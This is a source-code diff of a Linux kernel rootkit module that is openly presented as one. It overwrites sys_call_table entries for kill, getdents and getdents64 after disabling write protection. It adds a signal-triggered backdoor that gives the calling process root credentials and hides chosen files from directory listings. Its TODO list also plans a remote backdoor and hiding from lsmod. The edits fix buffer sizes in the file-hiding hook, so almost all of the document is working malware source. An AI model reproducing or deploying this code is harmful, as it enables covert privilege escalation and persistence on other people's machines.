@@ -11,6 +11,7 @@
 
 // TODO 
 // Hide files and processes
+// Non violatile hiding
 // Hide ports and add remote backdoor
 // Hide self from lsmod and other commands
 // Find the sys_call_table programmatically
@@ -27,7 +28,7 @@
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
 #define GPF_ENABLE write_cr0(read_cr0() | 0x10000)
 
-unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map
+unsigned long *sys_call_table = (unsigned long*) 0xc15b0000;  // hard coded, grep /boot/System.map
 
 // for hijacking sys_kill
 typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
@@ -48,7 +49,7 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	// kill backdoor
 	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
 		struct cred *cred;
-		cred = (struct cred *)__task_cred(current);
+		cred = (struct cred *) __task_cred(current);
 		cred->uid = 0;
 		cred->gid = 0;
 		cred->suid = 0;
@@ -157,20 +158,17 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,count))
 		return -1;
-	if ((kdirp = kmalloc(actual_result,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(count,GFP_KERNEL)) == NULL)
 		return -1;
-	if (copy_from_user(kdirp,dirp,actual_result))
+	if (copy_from_user((struct linux_dirent64 *)kdirp,dirp,count))
 		return -1;
 
 	// check result for files to hide
 	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
 		for (bp = 0; bp < actual_result;) {
-			//printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
 			d = (struct linux_dirent64 *) (kdirp + bp);
 			list_for_each_entry(ptr,&hidden_files,list) {
-				//printk(KERN_INFO "Current inode: %llu\n", (kdirp + i)->d_ino);
-				//printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
 				if (d->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
 					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
@@ -183,9 +181,9 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	}
 
 	// copy from kernel to userspace
-	if (!access_ok(VERIFY_WRITE,dirp,count))
+	if (!access_ok(VERIFY_WRITE,dirp,hacked_result))
 		return -1;
-	if (copy_to_user(dirp,kdirp,count))
+	if (copy_to_user(dirp,(struct linux_dirent64 *)kdirp,hacked_result))
 		return -1;
 	kfree(kdirp);
 
@@ -197,13 +195,13 @@ int rootkit_init(void) {
 	GPF_DISABLE;
 
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
-	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
 	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
-	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+	sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 
 	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
-	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
+	sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 
 	GPF_ENABLE;
 	printk(KERN_INFO "Loading rootkit\n");
@@ -217,9 +215,9 @@ void rootkit_exit(void) {
 	}
 
 	GPF_DISABLE;
-	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
-	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	GPF_ENABLE;
 
 	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
